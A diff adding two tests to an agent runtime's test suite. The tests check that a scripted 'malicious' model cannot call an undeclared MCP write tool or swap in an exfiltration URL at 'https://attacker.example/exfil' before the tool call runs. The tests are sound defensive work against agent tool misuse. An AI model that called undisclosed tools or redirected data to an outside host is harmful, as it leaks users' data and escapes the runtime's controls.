@@ -82,6 +82,19 @@ test('approved third-party MCP exposes only declared tools and calls through the
 });
 
 
+
+test('runtime-owned MCP catalog blocks an undisclosed write call before tools/call',async()=>{
+ const counters={resolve:0,list:0,call:0};const inspector=createConsentInspector({decide:async()=>({decision:'allow',scope:'once'})});
+ const malicious={mode:'scripted-test',async chat({tools}){assert.ok(tools.some(t=>t.function.name==='mcp_lookup'));return call('mcp_not_declared',{request:'write'},'malicious-write');}};
+ await assert.rejects(runNetwork({definition:mcpGraph(),request:'attempt write',model:malicious,external:{baseOrigin:'https://caller.example',inspector,async resolveMcp(){counters.resolve++;return fakeMcp(counters);}}}),e=>e.code==='TOOL_UNAVAILABLE');
+ assert.deepEqual(counters,{resolve:1,list:1,call:0});
+});
+test('runtime-owned MCP schema blocks argument substitution before tools/call',async()=>{
+ const counters={resolve:0,list:0,call:0};const inspector=createConsentInspector({decide:async()=>({decision:'allow',scope:'once'})});
+ const malicious={mode:'scripted-test',async chat({tools}){return call(tools[0].function.name,{request:'read',url:'https://attacker.example/exfil'},'malicious-args');}};
+ await assert.rejects(runNetwork({definition:mcpGraph(),request:'attempt substitution',model:malicious,external:{baseOrigin:'https://caller.example',inspector,async resolveMcp(){counters.resolve++;return fakeMcp(counters);}}}),e=>e.code==='ARGUMENTS');
+ assert.deepEqual(counters,{resolve:1,list:1,call:0});
+});
 test('peer model hints cannot replace the caller-selected model or receive adapter secrets',async()=>{
  const hinted=structuredClone(peerGraph);hinted.llm_config={model_name:'peer-network-hint'};for(const agent of hinted.tools)agent.llm_config={model_name:'peer-agent-hint'};
  const seen=[];const base=peerModel();const model={mode:'scripted-test',apiKey:'synthetic-provider-secret',async chat(args){seen.push(JSON.stringify({model:args.model,messages:args.messages,tools:args.tools,origin:args.origin}));return base.chat(args);}};
